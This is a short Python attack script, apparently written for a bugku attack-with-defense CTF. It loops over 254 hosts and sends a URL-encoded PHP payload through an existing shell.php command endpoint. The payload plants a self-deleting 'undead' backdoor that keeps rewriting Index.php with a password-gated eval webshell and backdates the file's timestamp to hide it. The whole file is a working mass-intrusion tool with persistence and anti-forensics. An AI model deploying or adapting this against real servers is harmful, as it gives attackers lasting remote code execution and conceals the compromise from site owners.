import requests
import re

shellstr="system(%22echo%20%27%3C?php%20ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);\$file=\%22Index.php\%22;\$code%20=%20\%22%3C?php%20if(md5(\\\$_GET[hihihi])==\\\%225c17eddb45a82ae4a49525efcaef9991\\\%22){@eval(\\\$_REQUEST[c]);}%20?%3E\%22;while%20(1){file_put_contents(\$file,\$code);system(\%22touch%20-m%20-d%20\\\%221018-12-01%2009:10:12\\\%22%20Index.php\%22);usleep(5000);}?%3E%27%20%3E%20Index.php%22);"

def writeShell():
    for i in range(1,255):
        try:
            requests.get("http://192-168-1-" + str(i) + ".awd.bugku.cn/shell.php?cmd="+shellstr)
            # 后门名字要改
        except:
            pass


while 1:
    writeShell()